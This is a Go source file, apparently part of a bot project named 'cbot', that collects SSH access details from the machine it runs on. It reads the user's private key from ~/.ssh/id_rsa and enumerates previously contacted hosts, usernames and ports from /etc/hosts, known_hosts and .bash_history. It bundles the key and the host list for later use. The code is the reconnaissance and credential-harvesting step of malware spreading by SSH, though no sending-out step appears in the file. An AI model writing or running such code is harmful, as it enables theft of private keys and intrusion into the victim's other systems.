package local

import (
	"fmt"
	"github.com/cbot/utils/fileutils"
	"io/ioutil"
	"os"
	"os/user"
	"strconv"
	"strings"
)

const (
	HOSTSFILE = "/etc/hosts"
	SSHKNOWNHOSTS = ".ssh/known_hosts"
	SSHPRIVKEYFILE = ".ssh/id_rsa"
	HISTORYFILE = ".bash_history"
	)

var noArgsSSHOptions map[string]bool = map[string]bool {

	"-4":true,
	"-6":true,
	"-A":true,
	"-a":true,
	"-C":true,
	"-f":true,
	"-G":true,
	"-g":true,
	"-K":true,
	"-k":true,
	"-M":true,
	"-N":true,
	"-n":true,
	"-q":true,
	"-s":true,
	"-T":true,
	"-t":true,
	"-V":true,
	"-v":true,
	"-X":true,
	"-x":true,
	"-Y":true,
	"-y":true,
}

type SSHLoginInfo struct {

	/*local machine ssh private key*/
	privateKey string

	/*local current user*/
	curUser string

	/*local machine logined to other hosts infos*/
	loginedHosts []*SSHHost

}

type SSHHost struct {

	user string
	ip   string
	domain string
	port int
	hostname string
}

func CollectSSHLoginInfo() *SSHLoginInfo {

	sshLoginInfo := &SSHLoginInfo{
		privateKey:   "",
		curUser:      getCurUser(),
		loginedHosts: make([]*SSHHost,0),
	}

	privKeyFile := getFilePathFromUserHome(SSHPRIVKEYFILE)

	if fileutils.FileIsExisted(privKeyFile) {

		if data,err := ioutil.ReadFile(privKeyFile);err==nil {

			sshLoginInfo.privateKey = string(data)

		}

	}

	sshLoginInfo.collectSSHHostFromHostsFile(sshLoginInfo.curUser)


	sshLoginInfo.collectSSHHostFromKnownHostsFile(sshLoginInfo.curUser)
	sshLoginInfo.collectSSHHostFromHistoryFile(sshLoginInfo.curUser)

	return sshLoginInfo
}

func (s *SSHLoginInfo) User() string {

	return s.curUser
}

func (s *SSHLoginInfo) PrivateKey()string {

	return s.privateKey
}

func (s *SSHLoginInfo) Hosts() []*SSHHost {

	return s.loginedHosts
}


func (h *SSHHost) UserName() string {

	return h.user
}

func (h *SSHHost) IP() string {

	return h.ip
}

func (h *SSHHost) Host() string {

	return h.domain
}

func (h *SSHHost) Port() int {

	return h.port
}

func (h *SSHHost) HostName()string {

	return h.hostname
}

func getFilePathFromUserHome(fname string) string {

	home,err := os.UserHomeDir()

	if err !=nil {

		home = "~"
	}

	return fmt.Sprintf("%s/%s",home,fname)
}

func getCurUser() string {


	if cur,err := user.Current(); err == nil {

		return cur.Username
	}

	return "root"
}

func getHost(hosts []*SSHHost,ip string,host string) *SSHHost {


	for _,sshHost := range hosts {

		if strings.EqualFold(sshHost.ip,ip) ||strings.EqualFold(sshHost.domain,host) {

			return sshHost
		}
	}

	return nil
}

func (s *SSHLoginInfo) collectSSHHostFromHostsFile(curUser string) {

	if fileutils.FileIsExisted(HOSTSFILE) {

		if lines, err := fileutils.ReadAllLines(HOSTSFILE); err == nil {

			for _, line := range lines {

				line = strings.TrimSpace(line)

				if line == "" || strings.HasPrefix(line, "#") || strings.Contains(line, ":") {

					continue
				}

				arr := strings.Split(line, " ")

				if len(arr) < 2 {
					continue
				}

				ip := arr[0]
				host := arr[len(arr)-1]

				if strings.EqualFold(host, "localhost") || strings.EqualFold(ip, "127.0.0.1") {

					continue
				}

				s.loginedHosts = append(s.loginedHosts, &SSHHost{
					user:          curUser,
					ip:            ip,
					domain:        host,
					port:          22,
					hostname:      host,
				})
			}
		}
	}

}

func (s *SSHLoginInfo) collectSSHHostFromKnownHostsFile(curUser string){

	fname := getFilePathFromUserHome(SSHKNOWNHOSTS)

	if fileutils.FileIsExisted(fname) {

		if lines, err := fileutils.ReadAllLines(fname); err == nil {

			for _, line := range lines {

				line = strings.TrimSpace(line)

				if line == "" {
					continue
				}

				arr := strings.Split(line," ")

				if len(arr) <1 {
					continue
				}

				host := arr[0]

				if strings.EqualFold(host,"localhost") ||strings.EqualFold(host,"127.0.0.1") {

					continue
				}

				sshHost := getHost(s.loginedHosts,host,host)
				if sshHost ==nil {

					s.loginedHosts = append(s.loginedHosts, &SSHHost{
						user:          curUser,
						ip:            host,
						domain:        host,
						port:          22,
						hostname:      host,
					})
				}
			}
		}
	}
}


func findSSHLoginStr(line string) (string,int) {

	var port int64 = 22
	var host string
	var err error

	maybeHost  := make([]string,0)

	sshCmd := line[strings.Index(line,"ssh "):]

	if sshCmd == "" {

		return "",22
	}

	sshArgs := sshCmd[4:]

	arr := strings.Split(sshArgs," ")

	if len(arr)<1  {

		return "",22
	}


	if len(arr) == 1 {

		return arr[0],22
	}

	n := len(arr)

	for i:=0;i<n;i++ {

		arg := arr[i]

		if strings.HasPrefix(arg,"-p") {

			//-p port
			if arg == "-p" {

				if i+1 <n {
					port,err = strconv.ParseInt(arr[i+1],10,32)
					if err!=nil {

						port = 22
					}

					i++
				}
			}else {
				// -p(port) no space
				if len(arg)>2 {

					port,err = strconv.ParseInt(arg[2:],10,32)
					if err!=nil {

						port = 22
					}
				}
			}

			continue
		}

		if strings.HasPrefix(arg,"-") {

			if !noArgsSSHOptions[arg] {

				i++
			}

			continue
		}

		maybeHost = append(maybeHost,arg)

	}

	if len(maybeHost)>=1 {

		host = maybeHost[0]
	}


	return host,int(port)
}




func (s *SSHLoginInfo) collectSSHHostFromHistoryFile(curUser string){


	fname := getFilePathFromUserHome(HISTORYFILE)

	if fileutils.FileIsExisted(fname) {

		if lines, err := fileutils.ReadAllLines(fname); err == nil {

			for _, line := range lines {

				line = strings.TrimSpace(line)

				if line == "" || !strings.Contains(line,"ssh ") {
					continue
				}

				hostStr,port:= findSSHLoginStr(line)

				if hostStr == "" {
					continue
				}

				user := curUser
				host := hostStr

				if strings.Contains(hostStr,"@") {

					arr := strings.Split(hostStr,"@")

					if len(arr)>=2 {

						user = arr[0]
						host = arr[1]
					}

				}

				if host == "" {
					continue
				}

				sshHost := getHost(s.loginedHosts,host,host)

				if sshHost == nil {

					s.loginedHosts = append(s.loginedHosts, &SSHHost{
						user:          user,
						ip:            host,
						domain:        host,
						port:          port,
						hostname:      host,
					})
				}else {

					if port!= 22 {
						sshHost.port = port
					}

					if user!= curUser {

						sshHost.user = user
					}

				}
			}
		}
	}

}






